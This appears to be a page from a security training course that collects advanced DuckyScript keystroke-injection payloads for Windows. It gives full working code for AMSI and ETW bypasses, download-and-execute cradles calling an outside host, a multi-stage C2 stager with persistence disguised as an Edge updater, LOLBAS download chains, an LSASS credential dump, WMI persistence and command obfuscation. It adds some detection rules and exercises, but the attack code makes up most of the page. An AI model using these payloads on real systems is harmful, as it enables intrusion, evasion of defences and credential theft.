# Advanced DuckyScript Payloads

## Overview

Advanced payloads incorporate multi-stage execution, evasion techniques, conditional logic, and sophisticated data handling.

---

## Payload A-01: AMSI Bypass + Download Cradle

```
REM ===============================================
REM Payload: AMSI Bypass with Download Cradle
REM Level: Advanced
REM Target: Windows 10/11 with Defender
REM MITRE: T1562.001 (Disable Security Tools)
REM ===============================================
REM Bypasses AMSI before downloading payload
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM AMSI Bypass (memory patching)
STRING $a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$c=$b.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($c,0x41414141)
ENTER
DELAY 500

REM Now download and execute (AMSI bypassed)
STRING IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')
ENTER
```

### Technical Analysis
1. **AMSI Context**: Locates AmsiContext in memory
2. **Memory Patch**: Corrupts AMSI scan buffer
3. **Download Cradle**: Now executes without AMSI scanning

### Blue Team Detection
```powershell
# Detect AMSI bypass attempts
# Monitor for these patterns in Script Block Logging
$patterns = @(
    'AmsiUtils',
    'amsiContext',
    'AmsiScanBuffer',
    'WriteInt32.*0x41'
)
```

---

## Payload A-02: ETW Patch + Fileless Execution

```
REM ===============================================
REM Payload: ETW Bypass + Fileless Payload
REM Level: Advanced
REM Target: Windows 10/11
REM MITRE: T1562.006 (Disable ETW)
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Patch ETW to disable logging
STRING $e=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');$ep=$e.GetValue($null);$f=$ep.GetType().GetField('m_enabled','NonPublic,Instance');$f.SetValue($ep,$false)
ENTER
DELAY 500

REM Execute payload in memory (no disk artifact)
STRING $code = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V3JpdGUtSG9zdCAiRVRXIEJ5cGFzc2VkISI='))
ENTER
STRING Invoke-Expression $code
ENTER
```

### Technical Analysis
- **ETW Patching**: Disables PowerShell event tracing
- **No Script Block Logs**: Events won't be recorded
- **Memory-Only**: Payload never touches disk

---

## Payload A-03: Multi-Stage C2 Beacon

```
REM ===============================================
REM Payload: Multi-Stage C2 Beacon
REM Level: Advanced
REM Target: Windows 10/11
REM MITRE: T1105, T1571 (Ingress Tool Transfer)
REM ===============================================

DELAY 2000

REM Stage 1: Initial stager (minimal footprint)
GUI r
DELAY 500
STRING cmd /c start /min powershell -w 1 -c "$u='http://192.168.1.100:8080';$s=(iwr $u/s -UseBasicParsing).Content;iex $s"
ENTER

REM Explanation of staging:
REM Stage 1: This payload - downloads stager
REM Stage 2: Stager script - establishes persistence + downloads beacon
REM Stage 3: Beacon - full C2 functionality
```

### Stage 2 Script (on C2 server as /s)
```powershell
# Stage 2: Persistence + Beacon Download
$beaconUrl = "http://192.168.1.100:8080/beacon.ps1"
$beaconPath = "$env:APPDATA\Microsoft\beacon.ps1"

# Download beacon
(New-Object Net.WebClient).DownloadFile($beaconUrl, $beaconPath)

# Create persistence
$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep b -f $beaconPath"
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdate" -Trigger $trigger -Action $action -Force

# Execute immediately
& $beaconPath
```

---

## Payload A-04: Living-off-the-Land (LOLBAS)

```
REM ===============================================
REM Payload: LOLBAS Chain
REM Level: Advanced
REM Target: Windows 10/11
REM MITRE: T1218 (Signed Binary Proxy Execution)
REM ===============================================
REM Uses only built-in Windows binaries
REM ===============================================

DELAY 2000

REM Stage 1: Use certutil to download (encoded)
GUI r
DELAY 500
STRING certutil -urlcache -split -f http://192.168.1.100/payload.b64 %TEMP%\p.b64
ENTER
DELAY 3000

REM Stage 2: Decode with certutil
GUI r
DELAY 500
STRING certutil -decode %TEMP%\p.b64 %TEMP%\p.exe
ENTER
DELAY 1000

REM Stage 3: Execute via mshta (AppLocker bypass)
GUI r
DELAY 500
STRING mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""%TEMP%\p.exe"", 0:close")
ENTER
```

### LOLBAS Alternatives
```
Download:
- certutil -urlcache -split -f URL FILE
- bitsadmin /transfer job URL FILE
- curl.exe -o FILE URL (Win10+)

Execute:
- mshta [URL/file]
- rundll32 [DLL,function]
- regsvr32 /s /n /u /i:[URL] scrobj.dll
- wmic process call create [command]

Encode/Decode:
- certutil -encode/-decode
- powershell [Convert]::ToBase64String/FromBase64String
```

---

## Payload A-05: Credential Dump via LSASS

```
REM ===============================================
REM Payload: LSASS Memory Dump
REM Level: Advanced
REM Target: Windows 10/11 (requires admin)
REM MITRE: T1003.001 (LSASS Memory)
REM ===============================================
REM Creates memory dump for offline credential extraction
REM ===============================================

DELAY 2000
GUI r
DELAY 500

REM Use comsvcs.dll (built-in, signed)
STRING powershell -w hidden -c "Start-Process cmd -ArgumentList '/c rundll32 comsvcs.dll,MiniDump (Get-Process lsass).Id $env:TEMP\l.dmp full' -Verb RunAs -WindowStyle Hidden"
ENTER

REM Alternative: Use procdump (if available)
REM STRING procdump -ma lsass.exe %TEMP%\lsass.dmp
```

### Blue Team Detection
```yaml
title: LSASS Memory Dump via comsvcs.dll
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - 'comsvcs'
            - 'MiniDump'
            - 'full'
    condition: selection
level: critical
```

---

## Payload A-06: WMI Persistence

```
REM ===============================================
REM Payload: WMI Event Subscription Persistence
REM Level: Advanced
REM Target: Windows 10/11
REM MITRE: T1546.003 (WMI Event Subscription)
REM ===============================================
REM Creates persistent WMI event that survives reboots
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Create WMI filter (triggers every 5 minutes)
STRING $FilterArgs = @{Name='PersistenceFilter';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA "Win32_LocalTime"'}
ENTER
STRING $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs
ENTER

REM Create WMI consumer (action to take)
STRING $ConsumerArgs = @{Name='PersistenceConsumer';CommandLineTemplate='powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.100:8080/beacon'')"'}
ENTER
STRING $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs
ENTER

REM Bind filter to consumer
STRING $BindArgs = @{Filter=$Filter;Consumer=$Consumer}
ENTER
STRING Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindArgs
ENTER
STRING exit
ENTER
```

### Blue Team Detection
```powershell
# Detect WMI persistence
Get-WmiObject -Namespace root/subscription -Class __EventFilter
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding

# Remove WMI persistence
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class __EventFilter | Remove-WmiObject
```

---

## Evasion Techniques Reference

### String Obfuscation
```
REM Original
STRING powershell

REM Obfuscated variations
STRING p^o^w^e^r^s^h^e^l^l
STRING pow""ersh""ell
STRING cmd /c "set p=powershell&&call %p%"
```

### Execution Delay Techniques
```
REM Instead of immediate execution
STRING ping -n 10 127.0.0.1 >nul && powershell ...

REM Scheduled delay
STRING schtasks /create /tn "tmp" /tr "powershell ..." /sc once /st 12:00 /f
```

### Parent Process Spoofing
```
REM Use wmic to change apparent parent
STRING wmic process call create "powershell -w hidden ..."
```

---

## Advanced Exercises

### Exercise A-01: Evasion Chain
Create a payload that:
1. Bypasses AMSI
2. Disables ETW
3. Downloads and executes in memory
4. Establishes WMI persistence
5. Leaves no obvious artifacts

### Exercise A-02: Detection Engineering
For each payload in this section:
1. Write a Sigma detection rule
2. Identify the MITRE technique
3. Suggest a prevention control

### Exercise A-03: Defense Bypass Analysis
Analyze why each evasion technique works:
1. What security control does it bypass?
2. What logging does it evade?
3. How can defenders still detect it?

---

[← Back to Advanced](../README.md)
